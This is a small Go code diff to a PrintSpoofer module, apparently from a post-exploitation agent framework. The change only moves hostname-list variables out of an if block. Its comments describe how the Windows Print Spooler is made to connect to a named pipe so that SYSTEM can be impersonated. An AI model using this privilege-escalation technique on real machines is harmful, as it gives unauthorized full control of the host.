@@ -165,6 +165,14 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 
 	alreadyConnected := connectErr == windows.ERROR_PIPE_CONNECTED
 
+	// Declare outside the if block so they're available for success output
+	var triggerWarnings []string
+	hostnames := []string{computerName}
+	if dnsHostname != "" && dnsHostname != computerName {
+		hostnames = append(hostnames, dnsHostname)
+	}
+	hostnames = append(hostnames, "localhost")
+
 	if !alreadyConnected {
 		// Trigger the Print Spooler to connect to our pipe.
 		// OpenPrinterW("\\HOSTNAME/pipe/{suffix}") causes the spooler to
@@ -181,12 +189,6 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		// The spooler must connect via SMB authentication (not local pipe) to
 		// impersonate as SYSTEM. Computer name and FQDN trigger SMB auth;
 		// localhost may connect via local path and yield NETWORK SERVICE.
-		var triggerWarnings []string
-		hostnames := []string{computerName}
-		if dnsHostname != "" && dnsHostname != computerName {
-			hostnames = append(hostnames, dnsHostname)
-		}
-		hostnames = append(hostnames, "localhost")
 
 		// Per-trigger timeout: 10 seconds for named hostnames, 5 for localhost.
 		// OpenPrinterW on domain-joined machines can block during name resolution.
